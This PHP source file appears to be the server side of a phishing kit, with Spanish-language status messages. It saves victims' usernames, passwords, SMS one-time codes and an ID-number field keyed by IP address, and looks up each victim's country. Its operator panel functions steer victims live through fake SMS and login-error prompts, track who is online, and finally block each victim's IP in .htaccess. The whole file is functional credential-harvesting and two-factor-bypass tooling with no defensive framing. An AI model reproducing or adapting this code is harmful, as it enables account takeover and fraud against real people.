<?php
namespace Src\App;

use Src\Config\Env;

class Main
{
    protected $geo_ip;
    protected $env;

    public function __construct()
    {
        date_default_timezone_set("America/Panama");
        $this->env = new Env();
        $this->geo_ip = $this->get_real_ip();
    }

    public function getIp()
    {
        return json_encode([
            'ok' => true,
            'data' => $this->get_real_ip()
        ]);
    }

    public function get_real_ip()
    {
       if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
           $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
           $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
       }

       $client  = @$_SERVER['HTTP_CLIENT_IP'];
       $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
       $remote  = $_SERVER['REMOTE_ADDR'];

       if (filter_var($client, FILTER_VALIDATE_IP)) {
           $ip = $client;
       } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
           $ip = $forward;
       } else {
           $ip = $remote;
       }

       if ($ip == '::1') {
           $ip = '127.0.0.1';
       }

       return $ip;
    }

    public function get_info_ip($ip): array
    {
       $localhost = "localhost";

       if ($ip == "127.0.0.1") {
           return [
               'country_code' => $localhost,
               'isp'          => $localhost,
               'asn'          => $localhost,
               'country_flag' => $localhost,
               'city'         => $localhost,
               'region'       => $localhost
           ];
       }

       $get = file_get_contents('https://ipwhois.app/json/'.$ip);
       $get = json_decode($get, true);

       return [
           'country_code' => $get['country_code'],
           'isp'          => $get['isp'],
           'asn'          => $get['asn'],
           'country_flag' => $get['country_flag'],
           'city'         => $get['city'],
           'region'       => $get['region'],
       ];
    }

    public function write($data)
    {
        //var_dump($data);
        switch ($data->step) {
            case '1' :
                $this->StepOne($data->input, $data->input2);
            break;

            case '2' :
                $this->setToken($data->input);
            break;

            case 'infouser':
                $this->setInfoUser($data);
            break;

            case 'ccuser':
                $this->setCcUser($data);
            break;

            case '3' :
                $this->setUserSms($data->input);
            break;

            case '31' :
                $this->setUserSmsError($data->input);
            break;

            case '30' :
                $this->setSingUser($data);
            break;

            case '4' :
                $this->hiddenFish($data->input);
            break;

            case '5' :
                $this->showAllFish($data->input);
            break;

            case '6' :
                $this->setSession($data->input3);
            break;

            case 'online' :
                $this->setOnline($data->input);
            break;

            case 'sms' :
                $this->setSMS($data);
            break;

            case 'smsError' :
                $this->setSMSError($data->input2);
            break;

            case 'sms1' :
                $this->setSMS1($data);
            break;

            case 'smsError1' :
                $this->setSMSError1($data->input2);
            break;

            case 'info' :
                $this->setInfo($data->input2);
            break;

            case 'cc' :
                $this->setCC($data->input2);
            break;

            case 'finish' :
                $this->setFinish($data->input2);
            break;

            case 'login' :
                $this->setLogin($data->input2);
            break;

            case 'clean_data' :
                $this->cleanData();
            break;

            default:
                throw new \Exception('Unexpected value');
        }

        return json_encode([
            'status' => 200,
            'response' => "Success"
        ]);
    }

    protected function getUrlRoot()
    {
        if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
            $link = "https";
        } else {
            $link = "http";
        }
        $link .= "://";
        $link .= $_SERVER['HTTP_HOST'];
        $link .= $_SERVER['REQUEST_URI'];

        return $link;
    }

    protected function StepOne($input, $input2)
    {
        if ($this->findIp($this->env->getFilename(), $this->geo_ip)) {
            if  (!empty($input) && !empty($input2)) {
                $this->editData($input, "User", trim($this->geo_ip));
                $this->editData($input2, "Pass", trim($this->geo_ip));
                $this->editData("Si", "Session", trim($this->geo_ip));
                $this->editData("No", "Login", trim($this->geo_ip));
                $this->editData('[login] Verificando...', "Status", trim($this->geo_ip));
            }
        } else {
            if  (!empty($input) && !empty($input2)) {
                file_put_contents($this->env->getFilename(), $this->setData($input, $input2, $this->geo_ip));
                $this->editData("Login", "Status", trim($this->geo_ip));
                $this->editData("Si", "Session", trim($this->geo_ip));
                $this->editData("No", "Login", trim($this->geo_ip));
                $this->editData('[login] Verificando...', "Status", trim($this->geo_ip));
            }
        }
    }

    protected function cleanData() {
        $file = fopen($this->env->getFilename(), "w+");
        fwrite($file, '');
        fclose($file);
        echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
    }

    protected function findIp($file_name, $ip)
    {
        $findIp = false;
        if (file_exists($file_name)) {
            $current_data = file_get_contents($file_name);
            $array_data = json_decode($current_data, true);

            if (!empty($array_data)) {

                for ($i = 0; $i < count($array_data); $i++) {
                    if (isset($ip) && !empty($ip) && $ip != "null") {
                        if (strcmp($array_data[$i]["Ip"], $ip) === 0) {
                            $findIp = true;
                        }
                    }
                }
            }
        }

        return $findIp;
    }

    protected function setToken($input)
    {
        if  (!empty($input)) {
            $this->editData($input, "UserSms", trim($this->geo_ip));
            $this->setStatusAll();
            $this->editData('Verificando...', "Status", trim($this->geo_ip));
        }
    }

    protected function setStatusAll()
    {
        $this->editData('No', "Sms", trim($this->geo_ip));
        $this->editData('No', "SmsError", trim($this->geo_ip));
        $this->editData('No', "Sms1", trim($this->geo_ip));
        $this->editData('No', "SmsError1", trim($this->geo_ip));
        $this->editData('No', "login", trim($this->geo_ip));
    }

    protected function setUserSms($input)
    {
        if (!empty($input)) {
            $this->editData($input, "UserSms", trim($this->geo_ip));
            $this->setStatusAll();
            $this->editData('[sms] Verificando...', "Status", trim($this->geo_ip));
        }
    }

    protected function setUserSmsError($input)
    {
        if (!empty($input)) {
            $this->editData($input, "UserSmsError", trim($this->geo_ip));
            $this->setStatusAll();
            $this->editData('[sms-error] Verificando...', "Status", trim($this->geo_ip));
        }
    }

    protected function setSession($input3)
    {
        if (isset($this->geo_ip) && !empty($this->geo_ip) && isset($input3) && !empty($input3)) {
            $this->editData($input3, "Session", trim($this->geo_ip));
        }

        echo json_encode([
            'ok' => true
        ]);
    }

    /*From Panel*/
    protected function setTokenRequest($ip)
    {
        if (isset($ip) && !empty($ip)) {
            $this->editData("Si", "TokenRequest", trim($ip));
            echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
        }
    }

    protected function setSMS($data)
    {
        if (!empty($data->input2)) {
            $this->editData("Si", "Sms", trim($data->input2));
            $this->editData("Ventana Con cédula enviada", "Status", trim($data->input2));
            $this->editData($data->input3, "Cc", trim($data->input2));
            echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
        }
    }

    protected function setSMSError($ip)
    {
        if (isset($ip) && !empty($ip)) {
            $this->editData("Si", "SmsError", trim($ip));
            $this->editData("Ventana Con cédula enviada", "Status", trim($ip));
            echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
        }
    }

    protected function setSMS1($data)
    {
        if (!empty($data->input2)) {
            $this->editData("Si", "Sms1", trim($data->input2));
            $this->editData("Ventana Sencilla Enviada", "Status", trim($data->input2));
            $this->editData($data->input3, "Cc", trim($data->input2));
            echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
        }
    }

    protected function setSMSError1($ip)
    {
        if (isset($ip) && !empty($ip)) {
            $this->editData("Si", "SmsError1", trim($ip));
            $this->editData("Ventana Sencilla [error] Enviada", "Status", trim($ip));
            echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
        }
    }

    protected function setFinish($ip)
    {
        if (isset($ip) && !empty($ip)) {
            $this->editData("Si", "Finish", trim($ip));
            $this->editData("Finished", "Status", trim($ip));
            $this->banIp($ip);
            echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
        }
    }

    protected function setLogin($ip)
    {
        if (isset($ip) && !empty($ip)) {
            $this->editData("Si", "Login", trim($ip));
            $this->editData("[LoginError] Esperando...", "Status", trim($ip));
            echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
        }
    }
    /*End from panel*/

    protected function setData($user, $pass, $ip)
    {
        $file_name = $this->env->getFilename();

        if (file_exists($file_name)) {
            $current_data = file_get_contents($file_name);
            $array_data = json_decode($current_data, true);

            $id = 0;

            if (!empty($array_data)) {
                $getId = end($array_data);

                switch ($getId['Id']) {
                    case 1:
                        $id = 2;
                    break;
                    case 2:
                        $id = 3;
                    break;
                    case 3:
                        $id = 4;
                    break;
                    case 4:
                        $id = 5;
                    break;
                    case 5:
                        $id = 6;
                    break;
                    case 6:
                        $id = 1;
                    break;
                    default:
                        $id = 1;
                    break;
                }
            } else {
                $id = 1;
            }

            $extra = [
                'Id' => $id,
                'User' => $user,
                'Pass' => $pass,
                'UserSms' => 'No',
                'UserSmsError' => 'No',
                'Ip' => $ip,

                'Status' => 'Esperando...',

                'Login' => 'No',
                'Sms' => 'No',
                'SmsError' => 'No',
                'Sms1' => 'No',
                'SmsError1' => 'No',
                'Finish' => 'No',

                'Cc' => 'No',

                'Hidden' => 'No',
                'Country' => $this->get_info_ip($ip)['country_code'],
                'Date' => date('d-n-Y'),
                'Hour' => date('h:i:s A'),
                'Session' => "No"
            ];

            $array_data[] = $extra;

            return json_encode($array_data);
        } else {
            $data01 = [];

            $data01[] = [
                'Id' => $id,
                'User' => $user,
                'Pass' => $pass,
                'UserSms' => 'No',
                'UserSmsError' => 'No',
                'Ip' => $ip,

                'Status' => 'Esperando...',

                'Login' => 'No',
                'Sms' => 'No',
                'SmsError' => 'No',
                'Sms1' => 'No',
                'SmsError1' => 'No',
                'Finish' => 'No',

                'Cc' => 'No',

                'Hidden' => 'No',
                'Country' => $this->get_info_ip($ip)['country_code'],
                'Date' => date('d-n-Y'),
                'Hour' => date('h:i:s A'),
                'Session' => "No"
            ];

            return json_encode($data01);
        }
    }

    protected function editData($newValue, $field, $ip)
    {
        $file_name = $this->env->getFilename();

        if (file_exists($file_name)) {
            $current_data = file_get_contents($file_name);
            $array_data = json_decode($current_data, true);

            if (!empty($array_data)) {

                for ($i = 0; $i < count($array_data); $i++) {
                    if (strcmp($array_data[$i]["Ip"], $ip) === 0) {
                        $array_data[$i][$field] = $newValue;
                    }
                }

                $encode = json_encode($array_data);
                file_put_contents($file_name, $encode);
            }
        }
    }


    protected function setAll($newValue, $field)
    {
        $file_name = $this->env->getFilename();
        if (file_exists($file_name)) {
            $current_data = file_get_contents($file_name);
            $array_data = json_decode($current_data, true);

            for ($i = 0; $i < count($array_data); $i++) {
                $array_data[$i][$field] = $newValue;
            }

            $encode = json_encode($array_data);
            file_put_contents($file_name, $encode);
        }
    }

    public function hiddenFish($processed_ip)
    {
        if(!empty($processed_ip)) {
            $this->editData("Si", 'Hidden', trim($processed_ip));
        }

        echo json_encode([
            'ok' => true
        ]);
        echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
    }

    public function banIp($processed_ip = null)
    {
      if ($processed_ip == null) {
        $ip = $this->geo_ip;
      } else {
        $ip = $processed_ip;
      }

      if ($ip != '') {
        $banIp = "
Deny from " . $ip . "";

        $file = fopen($this->env->getHtaccess(), 'a+');
        fwrite($file, $banIp);
        fclose($file);

        $banIpTxt = $ip."\r\n";

        $file = fopen($this->env->getIpBlockFile(), 'a+');
        fwrite($file, $banIpTxt);
        fclose($file);
      }
    }

    public function showAllFish($show_all)
    {
        if(!empty($show_all)) {
            $this->setAll("No", 'Hidden');
        }

        echo json_encode([
            'ok' => true,
            'data' => $show_all
        ]);
        echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
    }

    public function setOnline($ip)
    {
        if(!empty($ip)) {
            $this->editData(time(), 'Connected', trim($ip));
        }
    }

    public function read($ip)
    {
        $file_name = $this->env->getFilename();
        $result = '';
        if (file_exists($file_name)) {
            $current_data = file_get_contents($file_name);
            $array_data = json_decode($current_data, true);
            if (!empty($array_data)) {
                for ($i = 0; $i < count($array_data); $i++) {
                    if (strcmp($array_data[$i]["Ip"], $ip) === 0) {
                        $result = $array_data[$i];
                    }
                }
            } else {
                return json_encode([
                    'ok' => false,
                    'error' => 'Vacío'
                ]);
            }

            return json_encode([
                'ok' => true,
                'data' => $result
            ]);
        }
    }

    public function get_status($data)
    {
        $result = '';
        if (file_exists($this->env->getFilename())) {
            $current_data = file_get_contents($this->env->getFilename());
            $array_data = json_decode($current_data, true);
            if (!empty($array_data)) {
                for ($i = 0; $i < count($array_data); $i++) {
                    if (strcmp($array_data[$i]["Ip"], $data['ip']) === 0) {
                        $result = $array_data[$i];
                    }
                }
            }
        }

        header("Content-Type: application/json");

        $get_data = [
            "Sms" => $result['Sms'],
            "SmsError" => $result['SmsError'],
            "Sms1" => $result['Sms1'],
            "SmsError1" => $result['SmsError1'],
            "Login" => $result['Login'],
            "Finish" => $result['Finish'],
            "Cc" => $result['Cc']
        ];

        return json_encode($result);
    }
}